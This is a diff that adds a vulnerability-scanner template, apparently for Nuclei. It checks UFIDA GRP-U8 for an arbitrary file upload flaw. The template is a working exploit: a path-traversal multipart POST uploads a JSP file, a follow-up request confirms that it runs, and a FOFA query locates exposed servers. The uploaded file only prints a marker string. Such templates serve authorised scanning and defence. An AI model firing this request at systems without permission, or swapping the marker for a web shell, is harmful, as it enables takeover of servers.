@@ -1,0 +1,49 @@
+id: grp-u8-uploadfiledata
+
+info:
+  name: UFIDA GRP-U8 UploadFileData - Arbitrary File Upload
+  author: SleepingBag945
+  severity: critical
+  description: |
+    File upload vulnerability in UFIDA U8+ERP customer relationship management software. An attacker can use this vulnerability to gain control of the server.
+  reference:
+    - https://mp.weixin.qq.com/s/DZXFxLC7fFKbPUWrdyITag
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: title="用友GRP-U8行政事业内控管理软件"
+  tags: yonyou,fileupload,grp,intrusive
+
+http:
+  - raw:
+      - |
+        POST /UploadFileData?action=upload_file&filename=../{{randstr_1}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 327
+        Accept: */*
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqoqnjtcw
+        Accept-Encoding: gzip
+
+        ------WebKitFormBoundaryqoqnjtcw
+        Content-Disposition: form-data; name="upload"; filename="emgeyr.jsp"
+        Content-Type: application/octet-stream
+
+        <% {out.print("{{randstr_2}}");} %>
+        ------WebKitFormBoundaryqoqnjtcw
+        Content-Disposition: form-data; name="submit"
+
+        submit
+        ------WebKitFormBoundaryqoqnjtcw--
+      - |
+        GET /R9iPortal/{{randstr_1}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && contains(body_1,'showSucceedMsg')"
+          - "status_code_2 == 200 && contains(body_2,'{{randstr_2}}')"
+        condition: and
+
+# digest: 4a0a00473045022065622d9010a0899491ee909d944835b79a8f75e3a0c1843f5ab636b5353d1e8202210088c9c21a362c6f95b9c6fb4be62080f324980f636a36dfc0691d6519314d87da:922c64590222798bb761d5b6d8e72950
